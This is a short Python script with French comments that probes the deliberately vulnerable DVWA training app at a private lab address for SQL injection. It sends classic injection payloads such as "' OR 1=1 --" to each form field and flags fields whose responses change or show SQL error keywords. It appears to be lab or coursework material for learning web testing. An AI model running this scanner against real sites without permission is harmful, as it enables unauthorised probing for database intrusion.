import requests
from bs4 import BeautifulSoup

# URL de la page vulnérable DVWA
URL = "http://192.168.40.2/DVWA/vulnerabilities/sqli/"
COOKIES = {
    "PHPSESSID": "TON_COOKIE_ICI",
    "security": "low"
}

# Payloads SQLi classiques
PAYLOADS = [
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "1' AND '1'='1",
]

def get_form_fields(url):
    """Récupère les champs d'un formulaire HTML."""
    r = requests.get(url, cookies=COOKIES)
    soup = BeautifulSoup(r.text, "html.parser")
    inputs = soup.find_all("input")
    fields = [i.get("name") for i in inputs if i.get("name")]
    return fields

def test_payload(field, payload):
    """Teste un payload SQLi sur un champ donné."""
    params = {field: payload, "Submit": "Submit"}
    r = requests.get(URL, params=params, cookies=COOKIES)
    return r

def is_suspect(response_normal, response_test):
    """Compare deux réponses pour détecter un comportement anormal."""
    if response_normal.status_code != response_test.status_code:
        return True
    if len(response_normal.text) != len(response_test.text):
        return True
    keywords = ["error", "sql", "warning", "syntax"]
    if any(k.lower() in response_test.text.lower() for k in keywords):
        return True
    return False

def main():
    print("=== Détection de champs vulnérables à la SQLi ===\n")

    fields = get_form_fields(URL)
    print(f"Champs détectés : {fields}\n")

    # Réponse normale (sans payload)
    baseline = requests.get(URL, params={"id": "1", "Submit": "Submit"}, cookies=COOKIES)

    for field in fields:
        print(f"Test du champ : {field}")
        for payload in PAYLOADS:
            test = test_payload(field, payload)
            if is_suspect(baseline, test):
                print(f"  → ⚠️ Champ potentiellement vulnérable : {field}")
                print(f"    Payload déclencheur : {payload}\n")
                break
        else:
            print(f"  → Aucun comportement suspect détecté.\n")

if __name__ == "__main__":
    main()
